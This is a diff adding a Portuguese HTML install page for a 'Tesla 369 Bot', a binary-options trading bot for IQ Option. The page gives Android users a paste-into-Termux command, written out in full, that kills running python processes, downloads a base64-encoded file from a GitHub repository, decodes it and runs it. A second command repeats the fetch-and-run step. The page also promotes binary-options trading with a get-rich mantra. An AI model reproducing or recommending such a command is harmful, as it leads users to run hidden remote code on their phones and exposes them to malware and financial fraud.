@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Tesla 369 Bot - Instalação</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a1a;color:#fff;font-family:'Courier New',monospace;text-align:center;padding:20px}
+        .container{max-width:600px;margin:0 auto}
+        .logo{font-size:50px;margin:20px 0}
+        h1{color:#ffd700;font-size:24px;text-shadow:0 0 20px #ffd700}
+        .card{background:#1a1a3e;border:2px solid #ffd700;border-radius:15px;padding:25px;margin:20px 0;text-align:left}
+        .card h2{color:#ffd700;font-size:18px;margin-bottom:15px;text-align:center}
+        .step{background:#111;padding:15px;border-radius:10px;margin:10px 0;border-left:3px solid #ffd700}
+        .step .num{color:#ffd700;font-weight:bold;font-size:20px}
+        .step p{color:#ccc;font-size:14px;margin:5px 0;line-height:1.5}
+        .code{background:#000;color:#00ff88;padding:15px;border-radius:8px;font-size:11px;word-break:break-all;margin:10px 0;border:1px solid #333;position:relative}
+        .copy-btn{background:#ffd700;color:#000;border:none;padding:8px 16px;border-radius:5px;font-weight:bold;cursor:pointer;font-size:12px;position:absolute;top:10px;right:10px;font-family:'Courier New',monospace}
+        .btn{background:#ffd700;color:#000;padding:15px 30px;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;margin:10px;text-decoration:none;display:inline-block;font-family:'Courier New',monospace}
+        .emoji{font-size:30px}
+        .footer{color:#666;font-size:12px;margin-top:30px}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⚡</div>
+        <h1>TESLA 369 BOT</h1>
+        <p style="color:#888;margin:10px 0">Bot de Opções Binárias - IQ Option</p>
+        
+        <div class="card">
+            <h2>📱 Como Instalar no Celular</h2>
+            
+            <div class="step">
+                <span class="num">1️⃣</span>
+                <p><strong>Instale o Termux</strong></p>
+                <p>Baixe na Play Store:</p>
+                <a href="https://play.google.com/store/apps/details?id=com.termux" class="btn" style="padding:10px 20px;font-size:14px;margin:5px 0" target="_blank">📲 Abrir Play Store</a>
+            </div>
+            
+            <div class="step">
+                <span class="num">2️⃣</span>
+                <p><strong>Abra o Termux e cole o comando abaixo:</strong></p>
+                <div class="code" id="comando">
+                    pkg install python -y; pkill -f python 2>/dev/null; pip install flask && pip install requests && pip install api-iqoption-faria && curl -4 -s https://raw.githubusercontent.com/gynbetfc/v-sensitivo-bot/main/main.py -o bot.b64 && python -c "import base64; open('bot.py','w').write(base64.b64decode(open('bot.b64').read()).decode())" && rm bot.b64 && python bot.py & sleep 8 && termux-open-url http://127.0.0.1:5000
+                    <button class="copy-btn" onclick="copiar()">📋 Copiar</button>
+                </div>
+                <p style="color:#ffd700;font-size:12px">⚠️ Se travar em 99%, aperte Ctrl+C e depois ENTER</p>
+            </div>
+            
+            <div class="step">
+                <span class="num">3️⃣</span>
+                <p><strong>O Chrome abre automaticamente com o bot!</strong></p>
+                <p style="color:#00ff88">✅ Pronto! IP do seu celular = sem bloqueio!</p>
+            </div>
+            
+            <div class="step">
+                <span class="num">4️⃣</span>
+                <p><strong>Adicione à tela inicial:</strong></p>
+                <p>No Chrome, toque nos 3 pontinhos ⋮ > "Adicionar à tela inicial"</p>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>🔄 Já instalou?</h2>
+            <p style="color:#ccc;font-size:14px;margin:10px 0">Se já tem o Termux configurado, use este comando para iniciar:</p>
+            <div class="code" id="comando2">
+                curl -4 -s https://raw.githubusercontent.com/gynbetfc/v-sensitivo-bot/main/main.py -o bot.b64 && python -c "import base64; open('bot.py','w').write(base64.b64decode(open('bot.b64').read()).decode())" && rm bot.b64 && python bot.py & sleep 8 && termux-open-url http://127.0.0.1:5000
+                <button class="copy-btn" onclick="copiar2()">📋 Copiar</button>
+            </div>
+        </div>
+        
+        <div style="margin:20px 0">
+            <p style="color:#ffd700;font-size:18px">🌀 O DINHEIRO VEM ATÉ MIM DE TODOS OS LADOS 🌀</p>
+        </div>
+        
+        <div class="footer">
+            <p>⚡ Tesla 369 Bot v6.5.0</p>
+            <p>IP do celular | Grátis | Multiplayer</p>
+        </div>
+    </div>
+    
+    <script>
+    function copiar() {
+        var texto = document.getElementById('comando').innerText.replace('📋 Copiar','').trim();
+        navigator.clipboard.writeText(texto).then(function() {
+            alert('✅ Comando copiado! Cole no Termux.');
+        });
+    }
+    function copiar2() {
+        var texto = document.getElementById('comando2').innerText.replace('📋 Copiar','').trim();
+        navigator.clipboard.writeText(texto).then(function() {
+            alert('✅ Comando copiado! Cole no Termux.');
+        });
+    }
+    </script>
+</body>
+</html>
